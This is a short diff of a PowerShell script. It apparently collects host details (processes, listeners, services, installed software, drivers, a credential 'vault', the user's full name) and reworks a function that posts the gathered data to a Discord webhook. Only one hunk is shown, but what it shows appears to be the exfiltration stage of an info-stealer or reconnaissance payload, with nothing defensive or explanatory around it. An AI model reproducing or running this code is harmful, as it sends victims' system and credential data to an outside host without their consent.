@@ -320,21 +320,28 @@ process,listener,listenerItem,process,service,software,drivers,videocard,
 vault -ErrorAction SilentlyContinue -Force
 
 ############################################################################################################################################################
-
-# Function: Send to Discord
 function Send-ToDiscord {
     param ($Message)
+
+    # Define the JSON payload
     $payload = @{
         "content" = "```$Message```"
     } | ConvertTo-Json -Compress
 
+    # Define headers explicitly (optional but can help)
+    $headers = @{
+        "Content-Type" = "application/json"
+    }
+
+    # Use Invoke-RestMethod with explicit parameters
     try {
-        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method "Post" -ContentType "application/json" -Body $payload
+        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method "Post" -Headers $headers -Body $payload
         Write-Host "Data sent to Discord successfully."
     } catch {
         Write-Error "Failed to send data to Discord."
     }
 }
+
 
 # Main Script: Gather Information
 $FullName = Get-FullName
